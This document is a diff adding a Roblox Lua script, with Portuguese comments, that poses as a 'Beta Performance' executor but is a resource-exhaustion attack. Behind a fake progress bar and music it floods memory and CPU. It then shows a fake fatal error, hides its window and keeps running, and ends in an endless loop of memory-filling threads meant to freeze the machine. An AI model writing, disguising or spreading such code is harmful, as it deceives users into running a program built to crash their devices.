@@ -1,0 +1,99 @@
+-- V26 EXECUTOR: BETA PERFORMANCE MODULE (POWER X2)
+-- Tempo de Carga: 02:46 | Falso Erro: 15s | Loop Infinito: Ativo
+
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local lixo_v26 = {}
+local tempo_carga = 166 -- 2 minutos e 46 segundos
+local tempo_musica = 265 
+
+-- INTERFACE DE DISFARCE
+local Main = Instance.new("Frame", ScreenGui)
+Main.Size = UDim2.new(0, 280, 0, 90)
+Main.Position = UDim2.new(0.5, -140, 0.05, 0)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Draggable = true -- Permite mover a janelinha
+
+local Label = Instance.new("TextLabel", Main)
+Label.Size = UDim2.new(1, 0, 0.6, 0)
+Label.Text = "V26: Beta Performance (2x Power)"
+Label.TextColor3 = Color3.fromRGB(0, 255, 120)
+Label.BackgroundTransparency = 1
+Label.Font = Enum.Font.GothamBold
+Label.TextSize = 14
+
+local ProgressBarBackground = Instance.new("Frame", Main)
+ProgressBarBackground.Size = UDim2.new(0.9, 0, 0, 5)
+ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.8, 0)
+ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ProgressBarBackground.BorderSizePixel = 0
+
+local ProgressBar = Instance.new("Frame", ProgressBarBackground)
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
+ProgressBar.BorderSizePixel = 0
+
+-- ÁUDIO (RAINING TACOS)
+local Sound = Instance.new("Sound", game.Workspace)
+Sound.SoundId = "rbxassetid://142376088" 
+Sound.Looped = true
+Sound.Volume = 0.5
+Sound:Play()
+
+-- FUNÇÃO DE ATAQUE
+local function IniciarV26()
+    -- FASE 1: CARGA COM DOBRA DE FORÇA
+    for i = 1, tempo_carga do
+        pcall(function()
+            ProgressBar.Size = UDim2.new(i/tempo_carga, 0, 1, 0)
+            
+            -- Injeção Massiva de RAM
+            for j = 1, 15 do 
+                table.insert(lixo_v26, string.rep("V26_BETA_STRESS", 900000))
+            end
+
+            -- Estresse de CPU Multithread
+            task.spawn(function()
+                local x = 0
+                for _ = 1, 150000 do x = math.sqrt(math.random()) * math.atan(x) end
+            end)
+        end)
+        task.wait(1)
+    end
+
+    -- FASE 2: O FALSO ERRO (15 SEGUNDOS)
+    Label.Text = "FATAL ERROR: Buffer_Stack_Overflow"
+    Label.TextColor3 = Color3.fromRGB(255, 0, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    
+    task.spawn(function()
+        for i = 1, 15 do
+            pcall(function()
+                -- Intensifica o ataque durante o erro
+                table.insert(lixo_v26, string.rep("V26_CRITICAL_HIT", 2000000))
+            end)
+            task.wait(1)
+        end
+        Main:Destroy() -- A interface some, mas o script vira um fantasma
+    end)
+
+    -- FASE 3: ATAQUE FINAL INVISÍVEL (MORTE DO SISTEMA)
+    task.wait(tempo_musica - tempo_carga)
+    Sound:Stop() -- Para a música para parecer que o app travou de vez
+
+    while true do
+        pcall(function()
+            task.spawn(function()
+                while true do 
+                    -- Metralhadora de RAM (Sem limites)
+                    table.insert(lixo_v26, string.rep("V26_ULTIMATE_DESTRUCTION", 4000000)) 
+                end
+            end)
+        end)
+        task.wait(0.03) -- Velocidade máxima de repetição
+    end
+end
+
+-- Inicia o processo
+task.spawn(IniciarV26)
